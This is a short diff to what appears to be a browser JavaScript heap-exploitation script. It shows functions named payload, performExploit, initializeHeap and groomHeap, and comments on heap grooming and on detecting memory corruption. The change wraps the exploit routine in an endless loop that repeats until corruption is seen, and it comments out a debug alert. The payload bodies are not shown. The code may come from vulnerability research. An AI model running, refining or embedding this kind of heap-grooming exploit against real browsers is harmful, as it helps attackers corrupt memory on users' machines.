@@ -74,6 +74,7 @@ function payload() {
 }
 // Step 5: Perform the Exploit
 function performExploit() {
+    while (true){
     let controlledBuffers = initializeHeap(); // Initialize the heap
     let groomedHeap = groomHeap(); // Groom the heap
 
@@ -105,9 +106,11 @@ function performExploit() {
     for (let i = 0; i < view.length; i++) {
         if (view[i] !== 0x41) { // Check for changes from the initial pattern
             alert("Memory corruption detected at index " + i + ": " + view[i]);
+            break;
         }
-        alert("Memory buffer after grooming " + i + ": " + view[i]);
+        //alert("Memory buffer after grooming " + i + ": " + view[i]);
     }
+}
 }
 
 performExploit();
